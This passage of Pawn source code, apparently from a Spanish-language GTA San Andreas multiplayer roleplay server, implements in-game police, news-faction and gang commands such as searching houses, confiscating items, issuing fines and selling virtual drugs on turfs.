		if(HouseInfo[casa][hCerrada] == 0){SendClientMessage(playerid,Rojo,"* Esta puerta ya está abierta."); return 1;}
		HouseInfo[casa][hCerrada] = 0;
		UpdateHouseLabel(casa);
		SendClientMessage(playerid, AzulClaro, "Has irrumpido en una casa en nombre de la ley.");
		format(string, sizeof(string), "* %s abre la puerta de una casa por la fuerza.", GetPlayerNameRP(playerid));
	    ProxDetector(15.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
		printf("%s (Casa: %d)", string, casa);
		PlayerPlaySound(playerid, 1009, 0.0, 0.0, 0.0);
		new Float:EX, Float:EY, Float:EZ;
		EX = HouseInfo[casa][hEntradaX], EY = HouseInfo[casa][hEntradaY], EZ = HouseInfo[casa][hEntradaZ];
		for(new i=0; i<MAX_PLAYERS; i++)
		{
		    if(GetPlayerDentroCasa(i) == casa || IsPlayerInRangeOfPoint(i, 10.0, EX, EY, EZ))PlayerPlaySound(i, 1009, 0.0, 0.0, 0.0);
		}
	}
	else if(GetPlayerFueraPuertaNego(playerid)) //Está en la puerta de un negocio
	{
		new nego = GetPlayerFueraPuertaNego(playerid);
		if(NegoInfo[nego][nCerrado] == 0){SendClientMessage(playerid,Rojo,"* Esta puerta ya está abierta."); return 1;}
		NegoInfo[nego][nCerrado] = 0;
		UpdateNegocioLabel(nego);
		SendClientMessage(playerid, AzulClaro, "Has irrumpido en una local en nombre de la ley.");
		format(string, sizeof(string), "* %s abre la puerta de un local por la fuerza.", GetPlayerNameRP(playerid));
	    ProxDetector(15.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
		printf("%s (Negocio: %d)", string, nego);
		PlayerPlaySound(playerid, 1009, 0.0, 0.0, 0.0);
		new Float:EX, Float:EY, Float:EZ;
		EX = NegoInfo[nego][nEntradaX], EY = NegoInfo[nego][nEntradaY], EZ = NegoInfo[nego][nEntradaZ];
		for(new i=0; i<MAX_PLAYERS; i++)
		{
		    if(GetPlayerDentroNego(i) == nego || IsPlayerInRangeOfPoint(i, 10.0, EX, EY, EZ))PlayerPlaySound(i, 1009, 0.0, 0.0, 0.0);
		}
	}
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/registrar", true) == 0) //Registrar una casa o local
{
    if(PlayerInfo[playerid][pFaccion] != 1){SendClientMessage(playerid,Rojo,"* No eres policía."); return 1;}
	if(PlayerInfo[playerid][pServicioPD] == 0){SendClientMessage(playerid,Rojo,"* No estás de servicio."); return 1;}
	if(PlayerInfo[playerid][pRango] < 2){SendClientMessage(playerid,Rojo,"* Rango insuficiente."); return 1;}
	if(!GetPlayerDentroCasa(playerid) && !GetPlayerDentroNego(playerid)){SendClientMessage(playerid,Rojo,"* No estás en una casa o un local."); return 1;}
	if(GetPlayerDentroCasa(playerid)) //Está en una casa
	{
		new casa = GetPlayerDentroCasa(playerid);
		format(string, sizeof(string), "* %s registra la casa en busca de objetos ilegales.", GetPlayerNameRP(playerid));
	    ProxDetector(15.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
		printf("%s (Casa: %d)", string, casa);
		for(new x=0; x < 10; x++)
		{
		    format(string, sizeof(string), "Hueco %d: %s (%d).", x+1, ObjetoInfo[HouseInfo[casa][hArmario][x]][NombreObjeto], HouseInfo[casa][hArmarioCant][x]);
		    SendClientMessage(playerid, AmarilloClaro, string);
		}
		format(string, sizeof(string), "Dinero: %d$", HouseInfo[casa][hDineroGuardado]);
		SendClientMessage(playerid, AmarilloClaro, string);
	}
	else if(GetPlayerDentroNego(playerid)) //Está en un local
	{
		new nego = GetPlayerDentroCasa(playerid);
		format(string, sizeof(string), "* %s registra el local en busca de objetos ilegales.", GetPlayerNameRP(playerid));
	    ProxDetector(15.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
		printf("%s (Local: %d)", string, nego);
		for(new x=0; x < NegoInfo[nego][nMaxAlmacen]; x++)
		{
		    format(string, sizeof(string), "Hueco %d: %s (%d).", x+1, ObjetoInfo[NegoInfo[nego][nAlmacen][x]][NombreObjeto], NegoInfo[nego][nAlmacenCant][x]);
		    SendClientMessage(playerid, AmarilloClaro, string);
		}
		format(string, sizeof(string), "Dinero: %d$", NegoInfo[nego][nDineroGuardado]);
		SendClientMessage(playerid, AmarilloClaro, string);
	}
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/confiscar", true) == 0) //Confiscar objetos de una casa o local
{
	if(PlayerInfo[playerid][pFaccion] != 1){SendClientMessage(playerid,Rojo,"* No eres policía."); return 1;}
	if(PlayerInfo[playerid][pServicioPD] == 0){SendClientMessage(playerid,Rojo,"* No estás de servicio."); return 1;}
	if(PlayerInfo[playerid][pRango] < 2){SendClientMessage(playerid,Rojo,"* Rango insuficiente."); return 1;}
	if(!GetPlayerDentroCasa(playerid) && !GetPlayerDentroNego(playerid)){SendClientMessage(playerid,Rojo,"* No estás en una casa o un local."); return 1;}
    new objetos[20];
	objetos = strtok(cmdtext, idx);
	if(!strlen(objetos))
	{
		SendClientMessage(playerid, Naranja, "* /Confiscar [Armas/Municion/Drogas]");
		return 1;
	}
	if(strcmp(objetos,"armas",true) == 0)
	{
	    if(GetPlayerDentroCasa(playerid)) //Está en una casa
		{
		    new TieneObjeto;
		    new casa = GetPlayerDentroCasa(playerid);
			for(new x=0; x < 10; x++)
			{
			    if(ObjetoInfo[HouseInfo[casa][hArmario][x]][IDArma] > 0)
			    {
				    format(string, sizeof(string), "* Un/a %s (%d) requisado.", ObjetoInfo[HouseInfo[casa][hArmario][x]][NombreObjeto], HouseInfo[casa][hArmarioCant][x]);
				    SendClientMessage(playerid, AmarilloClaro, string);
				    HouseInfo[casa][hArmario][x] = 0, HouseInfo[casa][hArmarioCant][x] = 0;
				    TieneObjeto = 1;
			    }
			}
			if(TieneObjeto == 0)SendClientMessage(playerid, AmarilloClaro, "* Nada.");
			format(string, sizeof(string), "* %s confisca las armas de la casa.", GetPlayerNameRP(playerid));
		 	ProxDetector(15.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
		 	printf("%s (Casa: %d)", string, casa);
			return 1;
		}
		if(GetPlayerDentroNego(playerid)) //Está en un local
		{
		    new TieneObjeto;
		    new nego = GetPlayerDentroNego(playerid);
			for(new x=0; x < NegoInfo[nego][nMaxAlmacen]; x++)
			{
			    if(ObjetoInfo[NegoInfo[nego][nAlmacen][x]][IDArma] > 0)
			    {
				    format(string, sizeof(string), "* Un/a %s (%d) requisado.", ObjetoInfo[NegoInfo[nego][nAlmacen][x]][NombreObjeto], NegoInfo[nego][nAlmacenCant][x]);
				    SendClientMessage(playerid, AmarilloClaro, string);
				    NegoInfo[nego][nAlmacen][x] = 0, NegoInfo[nego][nAlmacenCant][x] = 0;
				    TieneObjeto = 1;
			    }
			}
			if(TieneObjeto == 0)SendClientMessage(playerid, AmarilloClaro, "* Nada.");
			format(string, sizeof(string), "* %s confisca las armas del local.", GetPlayerNameRP(playerid));
		 	ProxDetector(15.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
		 	printf("%s (Local: %d)", string, nego);
			return 1;
		}
	}
	if(strcmp(objetos,"municion",true) == 0)
	{
	    if(GetPlayerDentroCasa(playerid)) //Está en una casa
		{
		    new TieneObjeto;
		    new casa = GetPlayerDentroCasa(playerid);
			for(new x=0; x < 10; x++)
			{
			    if((HouseInfo[casa][hArmario][x] <= 53 && HouseInfo[casa][hArmario][x] >= 39) || (HouseInfo[casa][hArmario][x] <= 124 && HouseInfo[casa][hArmario][x] >= 102)) //Municiones y cajas de armamento
			    {
				    format(string, sizeof(string), "* Un/a %s (%d) requisado.", ObjetoInfo[HouseInfo[casa][hArmario][x]][NombreObjeto], HouseInfo[casa][hArmarioCant][x]);
				    SendClientMessage(playerid, AmarilloClaro, string);
				    HouseInfo[casa][hArmario][x] = 0, HouseInfo[casa][hArmarioCant][x] = 0;
					TieneObjeto = 1;
			    }
			}
			if(TieneObjeto == 0)SendClientMessage(playerid, AmarilloClaro, "* Nada.");
			format(string, sizeof(string), "* %s confisca las municiones de la casa.", GetPlayerNameRP(playerid));
		 	ProxDetector(15.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
		 	printf("%s (Casa: %d)", string, casa);
			return 1;
		}
		if(GetPlayerDentroNego(playerid)) //Está en un local
		{
		    new TieneObjeto;
		    new nego = GetPlayerDentroNego(playerid);
			for(new x=0; x < NegoInfo[nego][nMaxAlmacen]; x++)
			{
			    if((NegoInfo[nego][nAlmacen][x] <= 53 && NegoInfo[nego][nAlmacen][x] >= 39) || (NegoInfo[nego][nAlmacen][x] <= 124 && NegoInfo[nego][nAlmacen][x] >= 102)) //Municiones y cajas de armamento
			    {
				    format(string, sizeof(string), "* Un/a %s (%d) requisado.", ObjetoInfo[NegoInfo[nego][nAlmacen][x]][NombreObjeto], NegoInfo[nego][nAlmacenCant][x]);
				    SendClientMessage(playerid, AmarilloClaro, string);
				    NegoInfo[nego][nAlmacen][x] = 0, NegoInfo[nego][nAlmacen][x] = 0;
					TieneObjeto = 1;
			    }
			}
			if(TieneObjeto == 0)SendClientMessage(playerid, AmarilloClaro, "* Nada.");
			format(string, sizeof(string), "* %s confisca las municiones del local.", GetPlayerNameRP(playerid));
		 	ProxDetector(15.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
		 	printf("%s (Local: %d)", string, nego);
			return 1;
		}
	}
	else if(strcmp(objetos,"drogas",true) == 0)
	{
        if(GetPlayerDentroCasa(playerid)) //Está en una casa
		{
		    new TieneObjeto;
		    new casa = GetPlayerDentroCasa(playerid);
			for(new x=0; x < 10; x++)
			{
			    if(HouseInfo[casa][hArmario][x] <= 86 && HouseInfo[casa][hArmario][x] >= 75)
			    {
				    format(string, sizeof(string), "* Un/a %s (%d) requisado.", ObjetoInfo[HouseInfo[casa][hArmario][x]][NombreObjeto], HouseInfo[casa][hArmarioCant][x]);
				    SendClientMessage(playerid, AmarilloClaro, string);
				    HouseInfo[casa][hArmario][x] = 0, HouseInfo[casa][hArmarioCant][x] = 0;
					TieneObjeto = 1;
			    }
			}
			if(TieneObjeto == 0)SendClientMessage(playerid, AmarilloClaro, "* Nada.");
			format(string, sizeof(string), "* %s confisca las drogas de la casa.", GetPlayerNameRP(playerid));
		 	ProxDetector(15.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
		 	printf("%s (Casa: %d)", string, casa);
			return 1;
		}
		if(GetPlayerDentroNego(playerid)) //Está en un local
		{
		    new TieneObjeto;
		    new nego = GetPlayerDentroNego(playerid);
			for(new x=0; x < NegoInfo[nego][nMaxAlmacen]; x++)
			{
			    if(NegoInfo[nego][nAlmacen][x] <= 86 && NegoInfo[nego][nAlmacen][x] >= 75)
			    {
				    format(string, sizeof(string), "* Un/a %s (%d) requisado.", ObjetoInfo[NegoInfo[nego][nAlmacen][x]][NombreObjeto], NegoInfo[nego][nAlmacenCant][x]);
				    SendClientMessage(playerid, AmarilloClaro, string);
				    NegoInfo[nego][nAlmacen][x] = 0, NegoInfo[nego][nAlmacen][x] = 0;
					TieneObjeto = 1;
			    }
			}
			if(TieneObjeto == 0)SendClientMessage(playerid, AmarilloClaro, "* Nada.");
			format(string, sizeof(string), "* %s confisca las drogas del local.", GetPlayerNameRP(playerid));
		 	ProxDetector(15.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
		 	printf("%s (Local: %d)", string, nego);
			return 1;
		}
	}
	else
	{
		SendClientMessage(playerid, Rojo, "* Opción inválida.");
	}
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/multar", true) == 0) //Multar a alguien
{
	if(PlayerInfo[playerid][pFaccion] != 1){SendClientMessage(playerid,Rojo,"* No eres policía."); return 1;}
	if(PlayerInfo[playerid][pServicioPD] == 0){SendClientMessage(playerid,Rojo,"* No estás de servicio."); return 1;}
	tmp = strtok(cmdtext, idx);
	if(!strlen(tmp))
 	{
		SendClientMessage(playerid, Naranja, "* /Multar [ID] [Coste]");
		return 1;
	}
	playerid2 = ReturnUser(tmp);
    if(!IsPlayerConnected(playerid2) || playerid2 == INVALID_PLAYER_ID){SendClientMessage(playerid,Rojo,"* ID inválida."); return 1;}
    if(playerid == playerid2){SendClientMessage(playerid,Rojo,"* No te puedes multar a tí mismo."); return 1;}
	if(PlayerInfo[playerid2][pFaccion] == 1){SendClientMessage(playerid,Rojo,"* No puedes multar a un policía."); return 1;}
	if(!GetPlayersProx(3.0, playerid, playerid2)){SendClientMessage(playerid, Rojo,"* Debe estar más cerca de tí."); return 1;}
	tmp = strtok(cmdtext, idx);
	if(!strlen(tmp))
 	{
		SendClientMessage(playerid, Naranja, "* /Multar [ID] [Coste]");
		return 1;
	}
	new coste = strval(tmp);
	if(coste < 1 || coste > 10000){SendClientMessage(playerid,Rojo,"* El coste debe estar entre 1$ y 10000$."); return 1;}
	format(string, sizeof(string), "* Has entregado a %s una multa de %d$. Espera a que la pague.", GetPlayerNameRP(playerid2), coste);
	SendClientMessage(playerid, Amarillo, string);
	format(string, sizeof(string), "* %s te ha entregado una multa de %d$. Escribe '/Aceptar Multa' para pagarla.", GetPlayerNameRP(playerid), coste);
	SendClientMessage(playerid2, Amarillo, string);
	MultaPrecio[playerid2] = coste, Multador[playerid2] = playerid;
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/reanimar", true) == 0) //Reanimar a alguien
{
	if(PlayerInfo[playerid][pFaccion] != 1){SendClientMessage(playerid,Rojo,"* No eres policía."); return 1;}
	if(PlayerInfo[playerid][pServicioPD] == 0){SendClientMessage(playerid,Rojo,"* No estás de servicio."); return 1;}
	tmp = strtok(cmdtext, idx);
	if(!strlen(tmp))
 	{
		SendClientMessage(playerid, Naranja, "* /Reanimar [ID]");
		return 1;
	}
	playerid2 = ReturnUser(tmp);
    if(!IsPlayerConnected(playerid2) || playerid2 == INVALID_PLAYER_ID){SendClientMessage(playerid,Rojo,"* ID inválida."); return 1;}
    if(playerid == playerid2){SendClientMessage(playerid,Rojo,"* No te puedes reanimar a tí mismo."); return 1;}
	if(!GetPlayersProx(3.0, playerid, playerid2)){SendClientMessage(playerid, Rojo,"* Debes estar más cerca de él."); return 1;}
	if(IsPlayerInAnyVehicle(playerid)){SendClientMessage(playerid, Rojo, "* No puedes reanimar a alguien desde un vehículo."); return 1;}
	if(PlayerInfo[playerid2][pMuerto] == 0){SendClientMessage(playerid, Rojo, "* Esta persona no necesita ser reanimada."); return 1;}
	TogglePlayerControllable(playerid, 0);
	TogglePlayerControllable(playerid2, 0);
	SetTimerEx("Descongelar", 8000, false, "i", playerid);
	SetTimerEx("Descongelar", 8000, false, "i", playerid2);
	PlayerInfo[playerid2][pMuerto] = 0;
	KillTimer(MuertoTimer[playerid2]);
	KillTimer(MuertoFlashTimer[playerid2]);
	RemovePlayerColorFade(playerid2);
	SetPlayerHealth(playerid2, 15);
	ApplyAnimation(playerid,"MEDIC","CPR",4.1,0,1,1,0,0,1);
	ApplyAnimation(playerid2,"CRACK","crckidle2",4.1,1,1,1,0,0,1);
	format(string, sizeof(string), "* %s ha reanimado a %s mediante primeros auxilios.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2));
    ProxDetector(20.0, playerid, string,Verde,Verde,Verde,Verde,Verde);
    format(string, sizeof(string), "* Has reanimado a %s.", GetPlayerNameRP(playerid2));
    SendClientMessage(playerid, AzulClaro, string);
    SendClientMessage(playerid2, AmarilloClaro, "Te han reanimado, pero sigues estando demasiado débil. Espera a que te atiendan en el hospital.");
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/trafponer", true) == 0) //Poner objetos de trafico
{
	if(PlayerInfo[playerid][pFaccion] != 1){SendClientMessage(playerid,Rojo,"* No eres policía."); return 1;}
	if(PlayerInfo[playerid][pServicioPD] == 0){SendClientMessage(playerid,Rojo,"* No estás de servicio."); return 1;}
	if(IsPlayerInAnyVehicle(playerid)){SendClientMessage(playerid, Rojo, "* No puedes usar este comando desde un vehículo."); return 1;}
	if(PlayerInfo[playerid][pRango] < 2){SendClientMessage(playerid, Rojo, "* Rango insuficiente."); return 1;}
	tmp = strtok(cmdtext, idx);
	if(!strlen(tmp))
 	{
		SendClientMessage(playerid, Naranja, "* /Trafico [Opción]");
		SendClientMessage(playerid, Naranja, "1 Clavos 2 Cono 3 Valla 4 Barrera");
		return 1;
	}
	switch(strval(tmp))
	{
		case 1:
		{
			new Float:plocx,Float:plocy,Float:plocz,Float:ploca;
			GetPlayerPos(playerid, plocx, plocy, plocz);
			GetPlayerFacingAngle(playerid,ploca);
			CreateCopObject(1,plocx,plocy,plocz,ploca);
		}
		case 2:
		{
		    new Float:plocx,Float:plocy,Float:plocz,Float:ploca;
			GetPlayerPos(playerid, plocx, plocy, plocz);
			GetPlayerFacingAngle(playerid,ploca);
			CreateCopObject(2,plocx,plocy,plocz-0.2,ploca);
		}
		case 3:
		{
		    new Float:plocx,Float:plocy,Float:plocz,Float:ploca;
			GetPlayerPos(playerid, plocx, plocy, plocz);
			GetPlayerFacingAngle(playerid,ploca);
			CreateCopObject(3,plocx,plocy,plocz-0.2,ploca);
		}
		case 4:
		{
		    new Float:plocx,Float:plocy,Float:plocz,Float:ploca;
			GetPlayerPos(playerid, plocx, plocy, plocz);
			GetPlayerFacingAngle(playerid,ploca);
			CreateCopObject(4,plocx,plocy,plocz-0.2,ploca);
		}
	}
 	Streamer_Update(playerid);
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if (strcmp(cmd,"/trafquitar",true) == 0)
{
	if(PlayerInfo[playerid][pFaccion] != 1){SendClientMessage(playerid,Rojo,"* No eres policía."); return 1;}
	if(PlayerInfo[playerid][pServicioPD] == 0){SendClientMessage(playerid,Rojo,"* No estás de servicio."); return 1;}
	if(IsPlayerInAnyVehicle(playerid)){SendClientMessage(playerid, Rojo, "* No puedes usar este comando desde un vehículo."); return 1;}
	if(PlayerInfo[playerid][pRango] < 2){SendClientMessage(playerid, Rojo, "* Rango insuficiente."); return 1;}
    DeleteClosestObject(playerid);
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if (strcmp(cmd,"/traflimpiar",true) == 0)
{
	if(PlayerInfo[playerid][pFaccion] != 1){SendClientMessage(playerid,Rojo,"* No eres policía."); return 1;}
	if(PlayerInfo[playerid][pServicioPD] == 0){SendClientMessage(playerid,Rojo,"* No estás de servicio."); return 1;}
	if(PlayerInfo[playerid][pRango] < 5){SendClientMessage(playerid, Rojo, "* Rango insuficiente."); return 1;}
    DeleteAllObjects();
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd,"/noticia",true) == 0 || strcmp(cmd,"/n",true) == 0) //Comando noticias LSN
{
	if(PlayerInfo[playerid][pFaccion] != 4){SendClientMessage(playerid, Rojo, "* No formas parte de LSN."); return 1;}
	if(!CocheLSN(GetPlayerVehicleID(playerid))){SendClientMessage(playerid, Rojo, "* No estás en un vehículo de LSN."); return 1;}
	new length = strlen(cmdtext);
	while ((idx < length) && (cmdtext[idx] <= ' '))
	{
		idx++;
	}
	new offset = idx;
	new result[80];
	while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
	{
		result[idx - offset] = cmdtext[idx];
		idx++;
	}
	result[idx - offset] = EOS;
	if(!strlen(result))
	{
		SendClientMessage(playerid, Naranja, "* /(N)oticia [Texto]");
		return 1;
	}
	format(string, sizeof(string), "[LSN] %s: %s", GetPlayerNameRP(playerid), result);
	NoticiasLSN(AmarilloClaro,string);
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd,"/directo",true) == 0) //Comando en vivo LSN
{
    if(PlayerInfo[playerid][pFaccion] != 4){SendClientMessage(playerid, Rojo, "* No formas parte de LSN."); return 1;}
	if(!CocheLSN(GetPlayerVehicleID(playerid))){SendClientMessage(playerid, Rojo, "* No estás en un vehículo de LSN."); return 1;}
	new coche = GetPlayerVehicleID(playerid);
	if(DirectoLSNCoche[coche] != NOEXISTE){SendClientMessage(playerid, Rojo, "* Este vehículo ya está emitiendo en directo."); return 1;}
	DirectoLSNCoche[coche] = playerid;
	for(new i=0; i<MAX_PLAYERS; i++)
	{
	    if(GetPlayerVehicleID(i) == coche)SendClientMessage(i, NaranjaOscuro, "Este vehículo emite en directo ahora. Todo el que hable dentro de él saldrá en la radio.");
	}
	SendClientMessage(playerid, Naranja, "Para parar el directo utiliza '/DirectoOff' o baja del vehículo.");
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd,"/directooff",true) == 0) //Comando en vivo LSN
{
    if(PlayerInfo[playerid][pFaccion] != 4){SendClientMessage(playerid, Rojo, "* No formas parte de LSN."); return 1;}
	if(!CocheLSN(GetPlayerVehicleID(playerid))){SendClientMessage(playerid, Rojo, "* No estás en un vehículo de LSN."); return 1;}
	new coche = GetPlayerVehicleID(playerid);
	if(DirectoLSNCoche[coche] == NOEXISTE){SendClientMessage(playerid, Rojo, "* Este vehículo no está emitiendo en directo."); return 1;}
	for(new i=0; i<MAX_PLAYERS; i++)
	{
	    if(GetPlayerVehicleID(i) == coche)SendClientMessage(i, NaranjaOscuro, "Este vehículo ya no emite en directo.");
	}
	DirectoLSNCoche[coche] = NOEXISTE;
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/distribuir", true) == 0) //Comando para distribuir drogas en turfs
{
    new faccion = PlayerInfo[playerid][pFaccion];
    if(faccion == 0){SendClientMessage(playerid, Rojo, "* No formas parte de una facción."); return 1;}
    if(FaccInfo[faccion][fTipo] != 3){SendClientMessage(playerid, Rojo, "* No formas parte de una banda o pandilla."); return 1;}
    if(PlayerInfo[playerid][pRango] < 7){SendClientMessage(playerid, Rojo, "* Necesitas tener rango igual o superior a 7 en tu facción para utilizar este comando."); return 1;}
    if(!GetPlayerTurf(playerid)){SendClientMessage(playerid, Rojo, "* No estás en ningún turf."); return 1;}
 	new turf = GetPlayerTurf(playerid);
 	if(TurfInfo[turf][tFaccion] != faccion){SendClientMessage(playerid, Rojo, "* Este turf no es de tu facción."); return 1;}
 	if(!IsPlayerInRangeOfPoint(playerid, 1.0, TurfInfo[turf][tDistrbuirDrogaX], TurfInfo[turf][tDistrbuirDrogaY], TurfInfo[turf][tDistrbuirDrogaZ]))
	{
		SendClientMessage(playerid, Rojo, "* No estás en el punto de reunión con el camello. Se te ha marcado en el minimapa.");
		SetPlayerCheckpoint(playerid, TurfInfo[turf][tDistrbuirDrogaX], TurfInfo[turf][tDistrbuirDrogaY], TurfInfo[turf][tDistrbuirDrogaZ], 0.5);
		return 1;
	}
	if(IsPlayerInAnyVehicle(playerid)){SendClientMessage(playerid, Rojo, "* Debes bajar del vehículo."); return 1;}
	
	new opcion[30];
	opcion = strtok(cmdtext, idx);
	if(!strlen(opcion))
	{
		SendClientMessage(playerid, Naranja, "* /Distribuir [Opción] [Cantidad]");
		SendClientMessage(playerid, Naranja, "Marihuana (15$/gr), Cocaina (60$/gr), Crack (25$/gr), Heroina (75$/gr)");
		SendClientMessage(playerid, Naranja, "Nota: El valor varía según el nivel de influencia del turf.");
		SendClientMessage(playerid, Naranja, "Nota: Nivel 4 (100/100), Nivel 3 (80/100), Nivel 2 (60/100), Nivel 1 (40/100)");
		return 1;
	}
	
	new porcentaje;
 	switch(TurfInfo[turf][tNivel])
	{
	    case 1: porcentaje = 40;
	    case 2: porcentaje = 60;
		case 3: porcentaje = 80;
		case 4: porcentaje = 100;
	}
	
	if(strcmp(opcion,"marihuana",true) == 0) //Vende marihuana en el turf
	{
	    if(TurfInfo[turf][tDrogaVendida][0] > 0)
	    {
	        format(string, sizeof(string), "* Ya han vendido este tipo de droga aquí recientemente. Debes esperar %d horas.", TurfInfo[turf][tDrogaVendida][0]);
	        SendClientMessage(playerid, Rojo, string);
	        return 1;
	    }
	    if(PlayerInfo[playerid][pManoDer] != 75 && PlayerInfo[playerid][pManoIzq] != 75){SendClientMessage(playerid, Rojo, "* No tienes un fardo de marihuana en ninguna mano."); return 1;}
	    tmp = strtok(cmdtext, idx);
		if(!strlen(tmp))
	 	{
			SendClientMessage(playerid, Naranja, "* /Distribuir Marihuana [Cantidad]");
			return 1;
		}
		new cantidad = strval(tmp);
		if(cantidad < 1){SendClientMessage(playerid, Rojo, "* La cantidad no puede ser nula o negativa."); return 1;}
		if(cantidad > PlayerInfo[playerid][pManoDerCant] && cantidad > PlayerInfo[playerid][pManoIzqCant]){SendClientMessage(playerid, Rojo, "* No hay tanta cantidad de droga en el fardo."); return 1;}

		if(PlayerInfo[playerid][pManoDer] == 75 && cantidad <= PlayerInfo[playerid][pManoDerCant])
		{
		    PlayerInfo[playerid][pManoDerCant] -= cantidad;
		}
		else if(PlayerInfo[playerid][pManoIzq] == 75 && cantidad <= PlayerInfo[playerid][pManoIzqCant])
		{
		    PlayerInfo[playerid][pManoIzqCant] -= cantidad;
		}
		new dinero = 15*cantidad*porcentaje/100;
		GivePlayerMoneyAC(playerid, dinero);
		switch(TurfInfo[turf][tNivel])
		{
		    case 1: format(string, sizeof(string), "Camello: No creo que se vaya a vender bien... Toma %d pavos.", dinero);
		    case 2: format(string, sizeof(string), "Camello: Tengo familia a la que alimentar tío, solo te puedo dar %d$.", dinero);
			case 3: format(string, sizeof(string), "Camello: Sigue trayéndome mierda de esta, se vende bien, toma %d$ por ella.", dinero);
			case 4: format(string, sizeof(string), "Camello: Aquí mandas tú, toma %d$.", dinero);
		}
		ProxDetector(15.0, playerid,string,Chat1,Chat2,Chat3,Chat4,Chat5);
		TurfInfo[turf][tDrogaVendida][0] += cantidad;
		return 1;
	}
	
	if(strcmp(opcion,"cocaina",true) == 0) //Vende cocaina en el turf
	{
	    if(TurfInfo[turf][tDrogaVendida][1] > 0)
	    {
	        format(string, sizeof(string), "* Ya han vendido este tipo de droga aquí recientemente. Debes esperar %d horas.", TurfInfo[turf][tDrogaVendida][1]);
	        SendClientMessage(playerid, Rojo, string);
	        return 1;
	    }
	    if(PlayerInfo[playerid][pManoDer] != 76 && PlayerInfo[playerid][pManoIzq] != 76){SendClientMessage(playerid, Rojo, "* No tienes un fardo de marihuana en ninguna mano."); return 1;}
	    tmp = strtok(cmdtext, idx);
		if(!strlen(tmp))
	 	{
			SendClientMessage(playerid, Naranja, "* /Distribuir Cocaina [Cantidad]");
			return 1;
		}
		new cantidad = strval(tmp);
		if(cantidad < 1){SendClientMessage(playerid, Rojo, "* La cantidad no puede ser nula o negativa."); return 1;}
		if(cantidad > PlayerInfo[playerid][pManoDerCant] && cantidad > PlayerInfo[playerid][pManoIzqCant]){SendClientMessage(playerid, Rojo, "* No hay tanta cantidad de droga en el fardo."); return 1;}

		if(PlayerInfo[playerid][pManoDer] == 76 && cantidad <= PlayerInfo[playerid][pManoDerCant])
		{
		    PlayerInfo[playerid][pManoDerCant] -= cantidad;
		}
		else if(PlayerInfo[playerid][pManoIzq] == 76 && cantidad <= PlayerInfo[playerid][pManoIzqCant])
		{
		    PlayerInfo[playerid][pManoIzqCant] -= cantidad;
		}
		new dinero = 60*cantidad*porcentaje/100;
		GivePlayerMoneyAC(playerid, dinero);
		switch(TurfInfo[turf][tNivel])
		{
		    case 1: format(string, sizeof(string), "Camello: No creo que se vaya a vender bien... Toma %d pavos.", dinero);
		    case 2: format(string, sizeof(string), "Camello: Tengo familia a la que alimentar tío, solo te puedo dar %d$.", dinero);
			case 3: format(string, sizeof(string), "Camello: Sigue trayéndome mierda de esta, se vende bien, toma %d$ por ella.", dinero);
			case 4: format(string, sizeof(string), "Camello: Aquí mandas tú, toma %d$.", dinero);
		}
		ProxDetector(15.0, playerid,string,Chat1,Chat2,Chat3,Chat4,Chat5);
		TurfInfo[turf][tDrogaVendida][1] += cantidad;
		return 1;
	}
	
	if(strcmp(opcion,"crack",true) == 0) //Vende crack en el turf
	{
	    if(TurfInfo[turf][tDrogaVendida][2] > 0)
	    {
	        format(string, sizeof(string), "* Ya han vendido este tipo de droga aquí recientemente. Debes esperar %d horas.", TurfInfo[turf][tDrogaVendida][2]);
	        SendClientMessage(playerid, Rojo, string);
	        return 1;
	    }
	    if(PlayerInfo[playerid][pManoDer] != 77 && PlayerInfo[playerid][pManoIzq] != 77){SendClientMessage(playerid, Rojo, "* No tienes un fardo de marihuana en ninguna mano."); return 1;}
	    tmp = strtok(cmdtext, idx);
		if(!strlen(tmp))
	 	{
			SendClientMessage(playerid, Naranja, "* /Distribuir Crack [Cantidad]");
			return 1;
		}
		new cantidad = strval(tmp);
		if(cantidad < 1){SendClientMessage(playerid, Rojo, "* La cantidad no puede ser nula o negativa."); return 1;}
		if(cantidad > PlayerInfo[playerid][pManoDerCant] && cantidad > PlayerInfo[playerid][pManoIzqCant]){SendClientMessage(playerid, Rojo, "* No hay tanta cantidad de droga en el fardo."); return 1;}

		if(PlayerInfo[playerid][pManoDer] == 77 && cantidad <= PlayerInfo[playerid][pManoDerCant])
		{
		    PlayerInfo[playerid][pManoDerCant] -= cantidad;
		}
		else if(PlayerInfo[playerid][pManoIzq] == 77 && cantidad <= PlayerInfo[playerid][pManoIzqCant])
		{
		    PlayerInfo[playerid][pManoIzqCant] -= cantidad;
		}
		new dinero = 25*cantidad*porcentaje/100;
		GivePlayerMoneyAC(playerid, dinero);
		switch(TurfInfo[turf][tNivel])
		{
		    case 1: format(string, sizeof(string), "Camello: No creo que se vaya a vender bien... Toma %d pavos.", dinero);
		    case 2: format(string, sizeof(string), "Camello: Tengo familia a la que alimentar tío, solo te puedo dar %d$.", dinero);
			case 3: format(string, sizeof(string), "Camello: Sigue trayéndome mierda de esta, se vende bien, toma %d$ por ella.", dinero);
			case 4: format(string, sizeof(string), "Camello: Aquí mandas tú, toma %d$.", dinero);
		}
